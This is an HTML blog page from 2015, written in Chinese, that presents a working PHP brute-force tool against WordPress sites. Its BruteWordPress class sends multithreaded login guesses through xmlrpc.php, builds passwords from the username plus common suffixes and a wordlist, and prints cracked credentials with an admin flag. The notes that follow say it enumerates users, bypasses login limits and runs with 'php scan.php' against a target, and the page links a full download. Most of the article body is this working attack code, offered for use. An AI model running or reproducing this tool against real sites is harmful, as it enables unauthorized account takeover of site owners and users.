@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="欢迎对该工具进行修改优化，转载请注明原作者，写代码不易。  为什么不用wpscan?  闲着蛋疼写着玩。   核心代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&amp;lt;?phpinclud">
+<meta name="keywords" content="php控">
+<meta property="og:type" content="article">
+<meta property="og:title" content="wordpress 用户枚举，爆破工具">
+<meta property="og:url" content="http://wolvez.club/2015/02/06/wordpress-brute/index.html">
+<meta property="og:site_name" content="wolvez&#39;s blog">
+<meta property="og:description" content="欢迎对该工具进行修改优化，转载请注明原作者，写代码不易。  为什么不用wpscan?  闲着蛋疼写着玩。   核心代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&amp;lt;?phpinclud">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://wolvez.oss-cn-hangzhou.aliyuncs.com/32348811296e75c15082c635cb39fde1.png">
+<meta property="og:updated_time" content="2019-07-19T12:35:57.570Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="wordpress 用户枚举，爆破工具">
+<meta name="twitter:description" content="欢迎对该工具进行修改优化，转载请注明原作者，写代码不易。  为什么不用wpscan?  闲着蛋疼写着玩。   核心代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&amp;lt;?phpinclud">
+<meta name="twitter:image" content="https://wolvez.oss-cn-hangzhou.aliyuncs.com/32348811296e75c15082c635cb39fde1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon_wolv.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon_wolv.ico" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon_wolv.ico">
+          
+        
+    
+    <!-- title -->
+    <title>wordpress 用户枚举，爆破工具</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/Search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2015/05/24/web-find-mysql-links/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2014/11/25/Discuz6-x-7-x-exp/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://wolvez.club/2015/02/06/wordpress-brute/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://wolvez.club/2015/02/06/wordpress-brute/&text=wordpress 用户枚举，爆破工具"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://wolvez.club/2015/02/06/wordpress-brute/&title=wordpress 用户枚举，爆破工具"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wolvez.club/2015/02/06/wordpress-brute/&is_video=false&description=wordpress 用户枚举，爆破工具"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=wordpress 用户枚举，爆破工具&body=Check out this article: http://wolvez.club/2015/02/06/wordpress-brute/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://wolvez.club/2015/02/06/wordpress-brute/&title=wordpress 用户枚举，爆破工具"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://wolvez.club/2015/02/06/wordpress-brute/&title=wordpress 用户枚举，爆破工具"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://wolvez.club/2015/02/06/wordpress-brute/&title=wordpress 用户枚举，爆破工具"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://wolvez.club/2015/02/06/wordpress-brute/&title=wordpress 用户枚举，爆破工具"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://wolvez.club/2015/02/06/wordpress-brute/&name=wordpress 用户枚举，爆破工具&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        wordpress 用户枚举，爆破工具
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">wolvez's blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2015-02-06T11:39:00.000Z" itemprop="datePublished">2015-02-06</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/php控/">php控</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>欢迎对该工具进行修改优化，转载请注明原作者，写代码不易。</p>
+</blockquote>
+<p><strong>为什么不用<code>wpscan</code>?</strong></p>
+<blockquote>
+<p>闲着蛋疼写着玩。</p>
+</blockquote>
+<p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/32348811296e75c15082c635cb39fde1.png" alt="2019-07-21-00-46-17"></p>
+<p><strong>核心代码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'init.php'</span>;</span><br><span class="line">define(<span class="string">"user"</span>, $argv[<span class="number">2</span>]);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BruteWordPress</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $rc;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rc = <span class="keyword">new</span> RollingCurl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rc-&gt;callback = <span class="keyword">$this</span>-&gt;create_request_callback(<span class="keyword">$this</span>-&gt;rc);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rc-&gt;__set(<span class="string">'window_size'</span>, Thread);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rc-&gt;__set(<span class="string">'time_out'</span>, TimeOut);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">create_request_callback</span><span class="params">($rc)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="params">($response, $info, $request)</span> <span class="title">use</span> <span class="params">($rc)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> ($info[<span class="string">'http_code'</span>] == <span class="number">404</span> || $info[<span class="string">'http_code'</span>] == <span class="number">403</span> || $info[<span class="string">'http_code'</span>] == <span class="number">500</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'[-] Access error!'</span> . PHP_EOL;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;rc-&gt;cancelRequests();</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            $p = $request-&gt;post_data;</span><br><span class="line">            preg_match_all(<span class="string">'/&lt;param&gt;&lt;value&gt;([^\s]+?)&lt;\/value&gt;&lt;\/param&gt;/'</span>, $p, $m);</span><br><span class="line">            $user = $m[<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">            $pass = $m[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/&lt;boolean&gt;(\d)&lt;\/boolean&gt;/'</span>, $response, $is_admin)) &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="comment">//echo '[*] Brote user ' . $user . " ..." . "\r";</span></span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="comment">//print_r($is_admin).PHP_EOL;</span></span><br><span class="line">                <span class="keyword">if</span> ($is_admin[<span class="number">1</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'[+] Bruteed~ -&gt; '</span> . iconv(<span class="string">"UTF-8"</span>,<span class="string">"GB18030//IGNORE"</span>,$user)  . <span class="string">':'</span> . $pass . <span class="string">' [is admin]'</span> . PHP_EOL;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;rc-&gt;cancelRequests();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'[+] Bruteed~ -&gt; '</span> . iconv(<span class="string">"UTF-8"</span>,<span class="string">"GB18030//IGNORE"</span>,$user)  . <span class="string">':'</span> . $pass . PHP_EOL;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;rc-&gt;cancelRequests();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $pass_file = preg_replace(<span class="string">'/\s$/'</span>, <span class="string">""</span>, file(wordlist));</span><br><span class="line">        $user_pre = <span class="keyword">array</span>(<span class="string">'123'</span>, <span class="string">'111'</span>, <span class="string">'1'</span>, <span class="string">'a'</span>, <span class="string">'pass'</span>, <span class="string">'!@#'</span>, <span class="string">'password'</span>, <span class="string">'abc'</span>, <span class="string">'1961'</span>, <span class="string">'1962'</span>, <span class="string">'1963'</span>, <span class="string">'1970'</span>, <span class="string">'1988'</span>, <span class="string">'1989'</span>, <span class="string">'1990'</span>, <span class="string">'1991'</span>, <span class="string">'1992'</span>, <span class="string">'1993'</span>, <span class="string">'1994'</span>, <span class="string">'1995'</span>, <span class="string">'1996'</span>, <span class="string">'1997'</span>, <span class="string">'1998'</span>, <span class="string">'1999'</span>, <span class="string">'2001'</span>, <span class="string">'2002'</span>, <span class="string">'2003'</span>, <span class="string">'2004'</span>, <span class="string">'2006'</span>, <span class="string">'2005'</span>, <span class="string">'2007'</span>, <span class="string">'2008'</span>, <span class="string">'2009'</span>, <span class="string">'2010'</span>, <span class="string">'2011'</span>, <span class="string">'2012'</span>, <span class="string">'2013'</span>, <span class="string">'2014'</span>, <span class="string">'2015'</span>);</span><br><span class="line">        <span class="keyword">foreach</span> ($user_pre <span class="keyword">as</span> $pre) &#123;</span><br><span class="line">            $pre_u[] = user . $pre;</span><br><span class="line">        &#125;</span><br><span class="line">        $p = array_merge($pre_u, $pass_file);</span><br><span class="line">        $passwords = array_unique($p);</span><br><span class="line">        array_unshift($passwords, user);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">foreach</span> ($passwords <span class="keyword">as</span> $pass) &#123;</span><br><span class="line">            $url = domain . <span class="string">'/xmlrpc.php'</span>;</span><br><span class="line">            $post_data = sprintf(<span class="string">'&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;%s&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;%s&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;'</span>, user, $pass);</span><br><span class="line">            $request = <span class="keyword">new</span> RollingCurlRequest($url, <span class="string">'POST'</span>, $post_data);</span><br><span class="line">            $request-&gt;options = $GLOBALS[<span class="string">"cUrl_options"</span>]; </span><br><span class="line">            <span class="keyword">$this</span>-&gt;rc-&gt;add($request);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rc-&gt;execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$brute = <span class="keyword">new</span> BruteWordPress();</span><br><span class="line">$brute-&gt;run();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>说明:</strong></p>
+<ol>
+<li><p>使用非常简单无需其它参数<br><code>php scan.php http://www.target.com</code></p>
+</li>
+<li><p>多线程同时进行,跑完一个用户成功立即退出该任务接着破另外一个用户</p>
+</li>
+<li><p>自动生成用户名相关并加到字典头部 大大的提高破解速度</p>
+</li>
+<li><p>模块可单独使用</p>
+</li>
+<li><p>枚举用户模块 能抓取大部分常规 wordpress站点用户<br>检查枚举到的用户是否为登陆用户如果不是则剔除大大的提高破解效率</p>
+</li>
+<li><p>该脚本 需curl 扩展支持</p>
+</li>
+<li><p>利用wordpress 的xmlrpc.php 文件破解<br>可绕过限制并判断是否为管理员用户</p>
+</li>
+<li><p>环境简单<br>仅需 php.exe 、php5ts.dll 、curl.dll </p>
+</li>
+</ol>
+<p><strong>文件说明</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">init.php 配置及功能函数</span><br><span class="line">enum_user.php 根据页面枚举用户</span><br><span class="line">chkuser.php 检测枚举到的用户是否为可登陆用户</span><br><span class="line">RollingCurl.php 多线程http请求类 （修改版）</span><br><span class="line">BruteWordPress.php 爆破类</span><br><span class="line">scan.php 主文件(要运行的文件)</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://wolvez.oss-cn-hangzhou.aliyuncs.com/files/php.zip" target="_blank" rel="noopener">绿色php环境</a><br><a href="https://wolvez.oss-cn-hangzhou.aliyuncs.com/files/wpbt.zip" target="_blank" rel="noopener">完整代码下载</a></p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/Search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://wolvez.club/2015/02/06/wordpress-brute/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://wolvez.club/2015/02/06/wordpress-brute/&text=wordpress 用户枚举，爆破工具"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://wolvez.club/2015/02/06/wordpress-brute/&title=wordpress 用户枚举，爆破工具"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wolvez.club/2015/02/06/wordpress-brute/&is_video=false&description=wordpress 用户枚举，爆破工具"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=wordpress 用户枚举，爆破工具&body=Check out this article: http://wolvez.club/2015/02/06/wordpress-brute/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://wolvez.club/2015/02/06/wordpress-brute/&title=wordpress 用户枚举，爆破工具"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://wolvez.club/2015/02/06/wordpress-brute/&title=wordpress 用户枚举，爆破工具"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://wolvez.club/2015/02/06/wordpress-brute/&title=wordpress 用户枚举，爆破工具"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://wolvez.club/2015/02/06/wordpress-brute/&title=wordpress 用户枚举，爆破工具"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://wolvez.club/2015/02/06/wordpress-brute/&name=wordpress 用户枚举，爆破工具&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 wolvez
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/Search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+
+
